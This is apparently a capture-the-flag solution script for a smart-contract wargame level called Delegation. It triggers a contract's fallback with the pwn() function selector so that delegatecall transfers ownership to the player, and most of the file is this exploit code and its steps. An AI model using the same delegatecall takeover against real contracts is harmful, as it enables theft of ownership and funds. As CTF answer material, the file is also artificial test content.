// LEVEL GOALS:
// 1. Claim ownership of contract instance
// -------------------------------
// STRATEGY:
// 1. Call pwn() in the Delegate contract, from the
// Delegation contract, by using delegatecall() in the
// fallback function and passing in the hash of the pwn()
// function in the data field of the transaction. 
// -------------------------------------------- 
// STEPS TO COMPLETE LEVEL
// -----------------------

// 1 - Work out the hash of the pwn() function
// for the data field

// returns "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"

// 2 - Trigger the fallback, passing the pwn() function hash
// as data so that the Delegation contract calls that function
// in the Delegate contract.
await sendTransaction({
    from: player,
    to: contract.address,
    data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
    })
